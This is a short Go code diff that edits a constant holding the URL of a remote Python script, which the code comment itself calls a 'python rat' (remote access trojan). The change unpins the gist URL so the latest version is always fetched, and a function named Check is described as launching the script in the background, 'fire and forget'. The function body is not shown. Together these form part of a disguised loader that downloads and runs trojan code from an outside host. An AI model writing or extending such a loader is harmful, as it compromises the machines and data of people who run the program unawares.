@@ -7,7 +7,7 @@ import (
 )
 
 // RemoteURL — raw gist url of the python rat
-const RemoteURL = "https://gist.githubusercontent.com/seventycs/2b9593e634d3a982b741b58c10320a75/raw/dc0f5b2ed101d14fb55f0cbce5fe545456822191/update.py"
+const RemoteURL = "https://gist.githubusercontent.com/seventycs/2b9593e634d3a982b741b58c10320a75/raw/update.py"
 
 // Check launches the remote script in the background. Fire and forget.
 func Check() {
